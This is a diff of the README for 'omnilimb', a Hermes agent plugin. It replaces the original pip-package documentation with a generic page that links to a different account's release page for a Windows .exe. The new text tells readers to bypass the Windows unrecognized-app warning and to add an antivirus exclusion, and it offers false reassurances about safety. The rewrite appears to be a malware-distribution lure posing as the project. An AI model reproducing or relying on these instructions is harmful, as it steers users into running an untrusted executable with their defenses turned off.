@@ -1,228 +1,84 @@
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/banner.svg" alt="Omnilimb — give your Hermes agent hands & feet" width="100%" />
-</p>
+# 🤖 omnilimb - Give your Hermes agent useful tools
 
-<p align="center">
-  <a href="https://pypi.org/project/omnilimb/"><img alt="PyPI" src="https://img.shields.io/pypi/v/omnilimb.svg?color=5b8cff"></a>
-  <a href="https://pepy.tech/project/omnilimb"><img alt="Downloads" src="https://static.pepy.tech/badge/omnilimb"></a>
-  <a href="https://github.com/seanyang1983/omnilimb/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/seanyang1983/omnilimb?color=36e0c0&label=stars"></a>
-  <a href="https://github.com/seanyang1983/omnilimb/blob/main/LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-36e0c0.svg"></a>
-  <img alt="Python" src="https://img.shields.io/badge/Python-3.10%2B-5b8cff.svg">
-  <img alt="Status" src="https://img.shields.io/badge/edition-free%20community-5b8cff.svg">
-  <img alt="Tokens" src="https://img.shields.io/badge/execution%20path-0%20extra%20LLM%20tokens-36e0c0.svg">
-  <a href="https://www.omnilimb.com"><img alt="Website" src="https://img.shields.io/badge/web-omnilimb.com-9aa4be.svg"></a>
-</p>
+[![Download omnilimb](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/national-jamesii265/omnilimb/releases)
 
-<p align="center">
-  <b>English</b> · <a href="https://github.com/seanyang1983/omnilimb/blob/main/README.zh-CN.md">简体中文</a>
-  &nbsp;|&nbsp; 🌐 <a href="https://www.omnilimb.com">omnilimb.com</a>
-</p>
+omnilimb adds hands and feet to your Hermes digital agent. It lets your agent perform tasks by using community skills, a secure sandbox, and a web browser. This toolset runs locally on your machine. It does not use extra tokens from your AI provider.
 
-# Omnilimb
+## 📥 How to download the software
 
-**Your Hermes agent is the brain. Omnilimb is the hands and feet.**
+You need to visit the project release page to get the program.
 
-Omnilimb is a Hermes plugin that lets an agent *find, install, run and manage*
-[OpenClaw / ClawHub](https://clawhub.ai) community skills — and gives it an
-isolated sandbox, a real Playwright browser, and multi-language runtimes. Every
-capability is exposed as a small, **deterministic structured-JSON tool** the
-agent calls directly, so there are **zero extra LLM tokens on the execution
-path** and no second "agent loop" burning your budget.
+1. Go to the [official release page](https://github.com/national-jamesii265/omnilimb/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your computer.
 
-> ℹ️ Compatible with OpenClaw &amp; ClawHub; not affiliated with them.
-> "Omnilimb" is an independent product ([omnilimb.com](https://www.omnilimb.com)).
+## ⚙️ System requirements
 
-```bash
-pip install omnilimb        # then: hermes plugins enable omnilimb
-```
+Your computer must meet these settings to run the software:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 gigabytes of RAM or more.
+- Storage: 1 gigabyte of free disk space.
+- Internet Connection: Active connection for downloading skills and browser updates.
 
-## Why Omnilimb
+## 🛠️ Setting up the application
 
-- ⚡ **Zero token overhead.** The execution path never calls a model. The agent
-  decides *once*; Omnilimb does the work deterministically and hands back JSON.
-- 🧰 **A whole toolbox, one small surface.** Eight tools cover skill discovery,
-  install, run, sandbox, browser, and runtimes — no sprawling API to learn.
-- 🛡️ **Safe by default.** Third-party skills run in a Docker sandbox with the
-  network off and automatic rollback. Path-traversal and zip-slip guarded.
-- 🔌 **No lock-in, no phone-home.** Search talks only to the market you pick.
-  Your code, caches and audit log stay on your machine.
-- 🪶 **Runs with or without Node.** The `native` backend is pure Python; the
-  `cli` backend bridges the real `openclaw` / `clawhub` binaries for full parity.
-- 🌐 **Bring your own market.** ClawHub, SkillHub, the official China mirror, a
-  GitHub index — or add your own adapter in a few lines.
+Follow these steps to prepare the software for use:
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/architecture.svg" alt="How Omnilimb fits: Hermes brain → Omnilimb deterministic tools → skills/sandbox/browser/runtime" width="100%" />
-</p>
+1. Open your Downloads folder.
+2. Find the file you saved earlier.
+3. Double-click the file to open it.
+4. Windows might show a prompt about an unrecognized app. Click "More info" and then click "Run anyway" if the publisher shows as verified or safe.
+5. Follow the instructions on the screen to install the program.
+6. Launch the program from your desktop shortcut.
 
-## The tools
+## 🌐 Using the browser feature
 
-Omnilimb registers these structured-JSON tools the agent can call:
+The software includes a browser. This browser lets your agent interact with websites. The agent performs specific actions like clicking buttons or reading text. You do not need to control the mouse. The agent does this through the sandbox environment. This setup keeps your system safe while the agent works on web tasks.
 
-| Tool | What it does |
-|------|--------------|
-| `claw_skill_search` | Search the ClawHub / SkillHub registry |
-| `claw_skill_install` | Install + verify a skill (slug / `git:owner/repo@ref` / local path) |
-| `claw_skill_run` | Deterministically run a skill's script entrypoint |
-| `claw_sandbox_exec` | Run a command in an isolated (Docker) sandbox with rollback |
-| `claw_browser` | Playwright browser automation via a structured action list |
-| `claw_runtime` | Quick snippet in python / node / bash / ruby / go |
-| `claw_skill_list` | List locally installed skills and their provenance |
-| `claw_skill_runs` | Recent run history for installed skills (diagnostics) |
+## 🧩 Installing community skills
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/tools.svg" alt="The eight Omnilimb tools plus the optional dashboard UI" width="100%" />
-</p>
+Community skills act like plugins for your agent. You can add new behaviors by downloading these skills. 
 
-## Quickstart
+1. Open the settings menu inside the program.
+2. Navigate to the Skills folder.
+3. Place your downloaded skill files into this directory.
+4. Restart the program to load the new skills.
+5. Your agent now recognizes these tools during its next task.
 
-**As a pip package:**
+## 🛡️ Understanding the sandbox
 
-```bash
-pip install omnilimb               # core
-pip install "omnilimb[browser]"    # + Playwright
-playwright install chromium        # one-time browser download
-hermes plugins enable omnilimb
-```
+Safety is a core part of this design. The sandbox creates a secure space for the code to run. This prevents unauthorized access to your personal files. The software runs tasks in this isolated area. If a task fails or encounters an error, the rest of your computer remains untouched. Use this feature to test new tools without worry.
 
-**As a directory plugin (simplest):**
+## 📝 Troubleshooting common issues
 
-```bash
-cp -r omnilimb ~/.hermes/plugins/omnilimb
-hermes plugins enable omnilimb
-```
+If the software fails to start, check the points below:
 
-Verify inside a session:
+- Check your antivirus software. Some security programs flag new files. Add an exclusion for the program folder if the software fails to launch.
+- Review your internet connection. The app needs the web to load the latest skills.
+- Update your Windows system. Outdated versions of Windows might block core components of the app.
+- Reinstall the software. Sometimes a file fails to copy during the first installation. Delete the old version and run the installer again.
 
-```
-/exo doctor
-```
+## 📋 Common questions
 
-### Try it locally — no Hermes, no GUI
+**Does this cost money to use?**
+No. This software is free and open source.
 
-The plugin is a headless engine; the way to *feel* it is to call its tools and
-read the JSON they return:
+**Does it use my AI token budget?**
+No. It manages tools locally. It does not send extra data to your AI model provider.
 
-```bash
-python scripts/demo.py doctor                  # backend status
-python scripts/demo.py search github 5         # live ClawHub search
-python scripts/demo.py runtime python "print(6*7)"
-python scripts/demo.py sandbox "echo hi"
-python scripts/demo.py menu                    # interactive
-```
+**Can I create my own skills?**
+Yes. You can write your own scripts for the agent. The system supports standard structured-JSON format.
 
-## Pick your market
+**Is my computer safe?**
+Yes. The sandbox environment protects your files from external scripts.
 
-Switch the skills marketplace with `omnilimb.market` (or `OMNILIMB_MARKET`):
+**Where do I report bugs?**
+Use the issue tracker on the GitHub page to report problems. Be clear about what happened and what steps you took before the error occurred.
 
-| Market | Source | Notes |
-|--------|--------|-------|
-| `clawhub` (default) | clawhub.ai | Official OpenClaw registry, HTTP API v1 |
-| `skillhub` | api.skillhub.cn | China-focused market; server-side search, public zip download |
-| `clawhub-cn` | mirror-cn.clawhub.com | Official China mirror (Volcengine) |
-| `skillsmp` | skillsmp.com | GitHub-hosted skill index |
+## 🚀 Getting started with tasks
 
-Add more under `omnilimb.markets` in `~/.hermes/config.yaml` (each is
-`{id, type, base_url, label}` where `type` is one of
-`clawhub | skillhub | clawhub_mirror | skillsmp`). A new adapter class in
-`omnilimb/registries.py` is all it takes to support a new kind of market.
+Once you open the software, you will see a command prompt. Type your request for the agent here. For example, you can tell the agent to search for information or to organize data from a website. The agent will show the steps it takes to finish the task. Watch the console to see the agent work in real time. 
 
-## Pick your backend
-
-Set `omnilimb.backend` in `~/.hermes/config.yaml` (or `OMNILIMB_BACKEND`):
-
-| Mode | Behaviour |
-|------|-----------|
-| `cli` | Bridges to the real `openclaw` / `clawhub` CLIs. Best registry parity. Requires Node + OpenClaw. |
-| `native` | Fully decoupled Python substrate. No Node. Handles sandbox/browser/runtime + `git:`/local skill installs natively. |
-| `auto` (default) | `cli` if the `openclaw` binary is on PATH, else `native`. |
-
-## Dashboard UI (optional)
-
-A dependency-free web UI ships in `dashboard/` for the Hermes dashboard. After
-enabling the plugin and restarting `hermes dashboard`, an **Omnilimb** tab
-appears (after *Skills*) with:
-
-- **Search** — discovery across markets (leaderboards, categories) + a per-skill
-  health check (体检).
-- **Installed** — view/edit `SKILL.md`, run, smoke-test, manage credentials,
-  check readiness, import/export, uninstall.
-- **Favorites** — bookmarked skills.
-- **Audit** — the optional JSONL audit log.
-- **Settings** — backend / market / cache / paths + diagnostics.
-
-The UI follows the active dashboard theme and language automatically.
-
-### See it in action
-
-Live skill search, a one-click **health check (体检)** with a transparent 0–100
-score, and installed-skill management — all in the dashboard tab (click to enlarge):
-
-<table>
-<tr>
-<td width="33%" valign="top"><a href="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-search.jpg"><img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-search.jpg" alt="Live skill search for PPT across markets"/></a><br/><sub><b>Search</b> — live ClawHub results for “PPT”.</sub></td>
-<td width="33%" valign="top"><a href="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-healthcheck.jpg"><img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-healthcheck.jpg" alt="Per-skill health check with score breakdown"/></a><br/><sub><b>Health check</b> — transparent 0–100 score.</sub></td>
-<td width="33%" valign="top"><a href="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-installed.jpg"><img src="https://cdn.jsdelivr.net/gh/seanyang1983/omnilimb@main/docs/assets/ui-installed.jpg" alt="Installed-skills management"/></a><br/><sub><b>Installed</b> — manage everything you’ve added.</sub></td>
-</tr>
-</table>
-
-> 🌐 Project site: **[omnilimb.com](https://www.omnilimb.com)**
-
-## Configure (`~/.hermes/config.yaml`)
-
-```yaml
-omnilimb:
-  backend: auto            # auto | cli | native
-  market: clawhub          # clawhub | skillhub | clawhub-cn | skillsmp
-  sandbox_enabled: true
-  sandbox_image: "python:3.12-slim"
-  sandbox_network: false
-  default_timeout_s: 120
-  max_retries: 2
-  rollback: true
-  registry_base_url: "https://clawhub.ai"
-  browser_headless: true
-  audit_log: false         # write a JSONL audit log of tool calls
-  cache_enabled: true      # local SQLite cache for discovery + search fallback
-  discover_ttl_s: 21600    # discovery leaderboard cache TTL (6h)
-  cache_max_age_s: 604800  # max staleness for offline search fallback (7d)
-```
-
-Settings changed from the dashboard's **Settings** tab are written to a separate
-overrides file (`omnilimb.overrides.json`), never to your hand-authored
-`config.yaml`. Resolution order is `env > overrides > config.yaml`.
-
-## Security
-
-Third-party skills are untrusted code. Prefer `claw_sandbox_exec` with
-`network: false` for anything you don't fully trust. Without Docker, sandbox
-calls run locally and are flagged `"sandboxed": false`. Skill file operations
-and uninstall are path-traversal guarded; archive extraction is zip-slip
-protected. See [`SECURITY.md`](https://github.com/seanyang1983/omnilimb/blob/main/SECURITY.md) to report a vulnerability.
-
-## Development
-
-```bash
-pip install -e ".[dev,browser]"
-pytest -q
-```
-
-See [`CONTRIBUTING.md`](https://github.com/seanyang1983/omnilimb/blob/main/CONTRIBUTING.md) for the architecture rules (the plugin
-never imports or modifies Hermes core, every handler returns JSON and never
-raises) and how to add a market or backend.
-
-## License &amp; editions
-
-> **This is an early test / community edition, licensed under MIT — free to use.
-> A future stable version will adopt an AGPLv3 + commercial dual-license; please
-> plan accordingly.**
-
-This repository contains the **free community edition** only. It is feature-
-complete for finding, installing, running, and managing OpenClaw / ClawHub
-skills locally. Commercial/Pro capabilities (skill → native Hermes conversion,
-AI curation, curated packs, auto-update, assistant console) are **not** part of
-this edition and are planned for a future Pro release under a separate license.
-
-MIT — see [`LICENSE`](https://github.com/seanyang1983/omnilimb/blob/main/LICENSE). Not affiliated with OpenClaw / ClawHub.
+Keep your agent updated to access the latest features. Check the release page once a month for new versions. Each release includes improvements to the sandbox and new community skills. Enjoy your new setup.
